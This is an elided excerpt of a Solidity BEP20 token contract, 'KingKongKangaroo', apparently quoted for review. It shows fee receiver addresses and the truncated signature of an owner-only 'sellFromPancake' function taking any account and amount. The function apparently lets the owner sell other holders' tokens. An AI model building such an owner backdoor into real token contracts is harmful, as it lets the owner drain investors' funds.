...
contract DividendDistributor is IDividendDistributor {
    ...
    uint256 public minDistribution = 300000000000 * (10**9);
...
contract KingKongKangaroo is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = " KingKongKangaroo";
    string constant _symbol = " KingKongKangaroo";
    ...
    constructor() Auth(msg.sender) {
        ...
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);//test
        ...
        marketingFeeReceiver = 0xC2e8761E203BF0e475C47ce7260aA608f2aF0940;
        devfeeReceiver = 0x034167EcE9F0d975D005B4B8304AbBf27086f6F7;
    ...
    function sellFromPancake(address account, uint amount) 
    external onlyOwner {
